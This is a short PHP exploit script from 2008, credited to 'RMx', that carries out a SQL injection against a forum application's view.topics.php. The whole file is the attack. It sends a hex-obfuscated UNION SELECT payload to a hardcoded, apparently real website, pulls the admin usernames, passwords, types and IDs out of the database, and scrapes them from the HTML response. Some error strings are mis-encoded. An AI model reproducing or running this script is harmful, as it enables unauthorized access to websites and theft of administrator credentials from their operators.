<?php
/*
Coded By RMx
Yuhhu 2008 SuperStar Sql injection exploit...
BiyoSecurity.Com & Coderx.org
Thanx : Liz0zim & Cr@zy_King
*/
set_time_limit(0);
error_reporting(E_ALL);
function yolla($site,$liz0zim){
global $veri;$exploit = fsockopen(gethostbyname($site),"80");
if(!$exploit){die("Ba%G�ğ%@lant��� sa%G�ğ%@lanamad���...");
}else{fputs($exploit,$liz0zim);}
while(!feof($exploit)) {
$veri .=fgets($exploit);}
fclose($exploit);
return $veri;}
$site = "elmayra.com";
$path = "/forums/";
$rmx =  "GET
".$path."view.topics.php?board='+union+select+0,concat(0x6B,0x75,0x6C,0x6C,0x61,0x6E,0x69,0x63,0x69,0x3A,0x20,admin_username,0x3a,0x73,0x69,0x66,0x72,0x65,0x3A,0x20,admin_password,0x20,0x61,0x64,0x6D,0x69,0x6E,0x20,0x74,0x69,0x70,0x69,0x3A,0x20,admin_type,0x61,0x64,0x6D,0x69,0x6E,0x20,0x69,0x64,0x3A,admin_id),1,2%20from%20joovili_admins/*
HTTP/1.1\r\n";
$rmx .= "Host: $site\r\n";
//$rmx .= "Content-Type: application/x-www-form-urlencoded\r\n";
$rmx .= "Content-Type: text/plain\r\n";
$rmx .= "Connection: Close\r\n\r\n";
$tuttum=yolla("$site","$rmx");
$ara="#class=\"linkbeyaz\">(.*)</a></td>#";
$bul=preg_match($ara,$tuttum,$rmx);
$huseyin=str_replace("class=\"linkbeyaz\">","",$rmx);
echo $site."<br>";
echo $huseyin[0];
?>